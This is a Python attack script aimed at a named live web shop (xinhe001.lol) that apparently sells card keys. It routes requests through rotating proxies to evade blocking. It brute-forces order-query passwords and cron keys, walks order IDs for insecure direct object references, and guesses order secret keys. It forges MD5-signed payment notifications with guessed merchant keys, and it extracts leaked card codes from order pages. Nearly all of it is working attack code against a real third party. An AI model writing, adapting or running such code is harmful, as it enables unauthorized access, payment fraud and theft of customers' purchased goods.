#!/usr/bin/env python3
"""xinhe001.lol multi-vector deep probe via rotating CN proxies (run on HK)."""
import hashlib
import json
import os
import re
import subprocess
import sys
import time

import requests

requests.packages.urllib3.disable_warnings()

BASE = "https://xinhe001.lol/shop/"
OUT = sys.argv[1] if len(sys.argv) > 1 else "/tmp/xinhe001_multi.json"
ROUNDS = int(sys.argv[2]) if len(sys.argv) > 2 else 25
PWD_FILE = sys.argv[3] if len(sys.argv) > 3 else "/workspace/query_pwd_list.txt"
PWD_LIMIT = int(sys.argv[4]) if len(sys.argv) > 4 else 80
API_N = int(sys.argv[5]) if len(sys.argv) > 5 else 50

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120"
SHOW = re.compile(r"showOrder\((\d+),\s*['\"]([^'\"]+)['\"]\)")
FAKA = re.compile(r"mod=faka&id=(\d+)&skey=([a-f0-9]{32})")
CARD = re.compile(r"<textarea[^>]*>([^<]+)</textarea>", re.S)
CSRF = re.compile(r'csrf_token\s*=\s*"([^"]+)"')
HASHSALT = re.compile(r"var hashsalt=(.+?);")


def load_env():
    env = {}
    path = "/data/config/proxy.env"
    if os.path.isfile(path):
        for line in open(path):
            if "=" in line and not line.startswith("#"):
                k, v = line.strip().split("=", 1)
                env[k] = v.strip('"').strip("'")
    return env


def leak(t):
    return (
        SHOW.search(t)
        or FAKA.search(t)
        or "kminfo" in t
        or ("----" in t and ("COM" in t or "sms" in t.lower()))
    )


def compute_hashsalt(expr):
    proc = subprocess.run(
        ["node", "-e", f"console.log({expr.strip()})"],
        capture_output=True,
        text=True,
        timeout=10,
    )
    return proc.stdout.strip() if proc.returncode == 0 else ""


def epay_sign(params, key):
    items = sorted(k for k in params if k != "sign" and params[k] != "")
    s = "&".join(f"{k}={params[k]}" for k in items) + key
    return hashlib.md5(s.encode()).hexdigest()


def connect():
    subprocess.run(["/data/automation/bin/qg-proxy-fetch.sh"], capture_output=True, timeout=35)
    env = load_env()
    px = env.get("PROXY_URL", "")
    if not px:
        return None, None, {"error": "no proxy"}
    proxies = {"http": px, "https": px}
    meta = {"area": env.get("PROXY_AREA", ""), "server": env.get("PROXY_SERVER", "")}
    s = requests.Session()
    s.verify = False
    s.proxies = proxies
    s.headers.update({"User-Agent": UA, "Referer": BASE, "Accept-Language": "zh-CN,zh;q=0.9"})
    for scheme in ("https", "http"):
        url = scheme.replace("https", "https://xinhe001.lol/shop/").replace("http", "http://xinhe001.lol/shop/")
        if scheme == "https":
            url = "https://xinhe001.lol/shop/"
        else:
            url = "http://xinhe001.lol/shop/"
        try:
            r = s.get(url, timeout=28, allow_redirects=True)
            if len(r.text) > 5000 and "ICP" not in r.text[:2000]:
                meta["scheme"] = scheme
                meta["home_len"] = len(r.text)
                return s, r.text, meta
        except Exception as e:
            meta[f"{scheme}_err"] = str(e)[:80]
    return None, None, meta


def deep_scan(s, home, meta):
    report = {
        "target": "xinhe001.lol",
        "ts": time.strftime("%Y-%m-%d %H:%M:%S"),
        "proxy_meta": meta,
    }
    csrf = CSRF.search(home).group(1) if CSRF.search(home) else ""
    report["csrf"] = csrf[:24]

    gc = json.loads(s.get(BASE + "ajax.php?act=getcount", timeout=20).text)
    report["getcount"] = gc
    orders = int(gc.get("orders", 5718))
    print("orders", orders, flush=True)
    time.sleep(1.2)

    # 1) surface paths
    surface = {}
    probes = [
        ("toollogs", "toollogs.php", {}),
        ("query", "", {"mod": "query"}),
        ("query_p2", "", {"mod": "query", "page": "2"}),
        ("query_so", "", {"mod": "so"}),
        ("query_data1", "", {"mod": "query", "data": "1"}),
        ("query_data138", "", {"mod": "query", "data": "138"}),
    ]
    for name, path, params in probes:
        try:
            url = BASE + path if path else BASE
            rr = s.get(url, params=params, timeout=18)
            so = SHOW.findall(rr.text)
            fk = FAKA.findall(rr.text)
            surface[name] = {"len": len(rr.text), "showOrder": len(so), "faka": len(fk)}
            if so or fk:
                surface[name]["sample"] = so[:5]
                print(f"SURFACE HIT {name}", len(so), flush=True)
        except Exception as e:
            surface[name] = {"err": str(e)[:60]}
        time.sleep(1.0)
    report["surface"] = surface

    # 2) extra paths
    extra = {}
    for p in [
        "user/ajax_chat.php",
        "other/submit.php",
        "assets/faka/js/csrf.js",
        "ajax.php?act=gettool",
        "ajax.php?act=getclass",
    ]:
        try:
            rr = s.get(BASE + p, timeout=12)
            extra[p] = {"len": len(rr.text), "leak": leak(rr.text)}
            if leak(rr.text):
                print("EXTRA HIT", p, flush=True)
        except Exception as e:
            extra[p] = {"err": str(e)[:50]}
        time.sleep(0.8)
    report["extra_paths"] = extra

    # 3) pwd scan slow
    pwd_hits = []
    pwds = []
    if os.path.isfile(PWD_FILE):
        with open(PWD_FILE, encoding="utf-8") as f:
            pwds = [x.strip() for x in f if x.strip()][:PWD_LIMIT]
    for pwd in pwds:
        try:
            r = s.get(BASE, params={"mod": "query", "data": pwd}, timeout=14)
            so = SHOW.findall(r.text)
            if so or leak(r.text):
                pwd_hits.append({"pwd": pwd, "via": "GET", "shows": so[:5]})
                print("PWD GET", pwd, flush=True)
            r2 = s.post(
                BASE + "ajax.php?act=query",
                data={"type": "1", "content": pwd, "pwd": pwd, "csrf_token": csrf},
                timeout=14,
            )
            if leak(r2.text):
                pwd_hits.append({"pwd": pwd, "via": "ajax", "body": r2.text[:250]})
                print("PWD ajax", pwd, flush=True)
        except Exception as e:
            print("pwd err", pwd, e, flush=True)
        time.sleep(1.0)
    report["pwd_hits"] = pwd_hits

    # 4) api IDOR
    api_hits = []
    for oid in range(orders, orders - API_N, -1):
        for act in ["search", "order", "query", "kmmail"]:
            try:
                r = s.get(BASE + f"api.php?act={act}&id={oid}", timeout=14)
                if leak(r.text) or (
                    '"code":0' in r.text
                    and "验证失败" not in r.text
                    and "不存在" not in r.text
                    and len(r.text) > 50
                ):
                    api_hits.append({"act": act, "id": oid, "body": r.text[:400]})
                    print("API HIT", act, oid, r.text[:80], flush=True)
            except Exception:
                pass
        time.sleep(1.2)
        if oid % 10 == 0:
            print(f"api progress {oid} hits={len(api_hits)}", flush=True)
    report["api_hits"] = api_hits

    # 5) ajax order skey brute
    order_hits = []
    for oid in range(orders, orders - 30, -1):
        for sk in [
            "",
            str(oid),
            hashlib.md5(str(oid).encode()).hexdigest(),
            hashlib.md5(f"xinhe{oid}".encode()).hexdigest(),
            hashlib.md5(f"xinghe001{oid}".encode()).hexdigest(),
        ]:
            try:
                rr = s.post(
                    BASE + "ajax.php?act=order",
                    data={"id": str(oid), "skey": sk, "csrf_token": csrf},
                    timeout=10,
                )
                if leak(rr.text) or (
                    '"code":0' in rr.text and "验证失败" not in rr.text
                ):
                    order_hits.append({"oid": oid, "skey": sk, "resp": rr.text[:400]})
                    print("ORDER HIT", oid, sk[:12], flush=True)
                    break
            except Exception:
                pass
        time.sleep(0.5)
    report["order_hits"] = order_hits

    # 6) pay + notify
    pay_info = {}
    notify_hits = []
    try:
        # find cheap tid from home
        tids = re.findall(r"mod=buy[^\"']*tid=(\d+)", home)
        tid = tids[0] if tids else "34"
        cids = re.findall(r"cid=(\d+)", home)
        cid = cids[0] if cids else "4"
        buy = s.get(BASE, params={"mod": "buy", "cid": cid, "tid": tid}, timeout=20)
        csrf2 = CSRF.search(buy.text).group(1)
        hs_m = HASHSALT.search(buy.text)
        hashsalt = compute_hashsalt(hs_m.group(1)) if hs_m else ""
        pay = s.post(
            BASE + "ajax.php?act=pay",
            data={
                "tid": tid,
                "inputvalue": "123456789",
                "num": "1",
                "hashsalt": hashsalt,
                "csrf_token": csrf2,
            },
            timeout=18,
        )
        pay_info["resp"] = pay.text[:400]
        pj = pay.json()
        pay_info["json"] = pj
        trade = pj.get("trade_no")
        if trade:
            pay_info["trade_no"] = trade
            keys = [
                "123456", "888888", "xinhe001", "xinghe001", "xinhe", "faka",
                "rainbow", "epay", "mapi", "admin", "12345678", "xinghe",
            ]
            for key in keys:
                params = {
                    "pid": "1000",
                    "type": "qqpay",
                    "out_trade_no": trade,
                    "notify_url": BASE + "other/epay_notify.php",
                    "return_url": BASE + "other/return.php",
                    "name": "test",
                    "money": "5.00",
                    "trade_no": trade,
                    "trade_status": "TRADE_SUCCESS",
                }
                params["sign"] = epay_sign(params, key)
                params["sign_type"] = "MD5"
                rr = s.post(BASE + "other/epay_notify.php", data=params, timeout=10)
                b = rr.text.strip()
                if b and b not in ("error", "fail", "FAIL") and "No Act" not in b:
                    notify_hits.append({"key": key, "body": b[:200]})
                    print("NOTIFY", key, b[:60], flush=True)
    except Exception as e:
        pay_info["error"] = str(e)[:120]
    report["pay"] = pay_info
    report["notify_hits"] = notify_hits

    # 7) cron
    cron_hits = []
    keys = {
        "xinhe001", "xinghe001", "xinhe", "xinghe", "xqycdn", "yunkv",
        "123456", "888888", "monitor", "cron", "faka", "rainbow",
    }
    if os.path.isfile(PWD_FILE):
        with open(PWD_FILE, encoding="utf-8") as f:
            for i, line in enumerate(f):
                if i >= 100:
                    break
                keys.add(line.strip())
    for k in keys:
        try:
            r = s.get(BASE + "cron.php", params={"key": k}, timeout=6)
            b = r.text.strip()
            if b and "不正确" not in b and "密钥" not in b:
                cron_hits.append({"key": k, "body": b[:300]})
                print("CRON", k, b[:60], flush=True)
        except Exception:
            pass
        time.sleep(0.3)
    report["cron_hits"] = cron_hits

    # 8) faka pull from any pairs found
    pairs = {}
    for v in surface.values():
        for item in v.get("sample", []):
            if isinstance(item, tuple):
                pairs[str(item[0])] = item[1]
    for m in FAKA.finditer(home):
        pairs[m.group(1)] = m.group(2)
    cards = []
    for oid, skey in list(pairs.items())[:15]:
        try:
            fk = s.get(BASE, params={"mod": "faka", "id": oid, "skey": skey}, timeout=12)
            m = CARD.search(fk.text)
            if m:
                cards.append({"id": oid, "card": m.group(1)[:200]})
                print("CARD", oid, m.group(1)[:60], flush=True)
        except Exception:
            pass
    report["cards"] = cards

    report["CARD_LEAK"] = bool(
        api_hits or order_hits or notify_hits or pwd_hits or cards
        or any(v.get("showOrder", 0) > 0 for v in surface.values() if isinstance(v, dict))
    )
    return report


def main():
    all_rounds = []
    wins = []
    for i in range(ROUNDS):
        print(f"=== round {i+1}/{ROUNDS} ===", flush=True)
        s, home, meta = connect()
        row = {"round": i + 1, **meta}
        if s and home:
            print("WIN proxy", meta, flush=True)
            try:
                deep = deep_scan(s, home, meta)
                row["deep"] = deep
                row["CARD_LEAK"] = deep.get("CARD_LEAK", False)
                if row["CARD_LEAK"]:
                    wins.append(row)
                    with open(OUT, "w") as f:
                        json.dump(
                            {
                                "target": "xinhe001.lol",
                                "ts": time.strftime("%Y-%m-%d %H:%M:%S"),
                                "wins": wins,
                                "rounds": all_rounds + [row],
                                "CARD_LEAK": True,
                            },
                            f,
                            indent=2,
                            ensure_ascii=False,
                        )
                    print("CARD_LEAK FOUND, saved", OUT, flush=True)
                    return
            except Exception as e:
                row["deep_err"] = str(e)[:200]
                print("deep err", e, flush=True)
        all_rounds.append(row)
        time.sleep(2)

    out = {
        "target": "xinhe001.lol",
        "ts": time.strftime("%Y-%m-%d %H:%M:%S"),
        "rounds": ROUNDS,
        "wins": wins,
        "results": all_rounds,
        "CARD_LEAK": False,
    }
    with open(OUT, "w") as f:
        json.dump(out, f, indent=2, ensure_ascii=False)
    print("DONE no leak", OUT, flush=True)


if __name__ == "__main__":
    main()
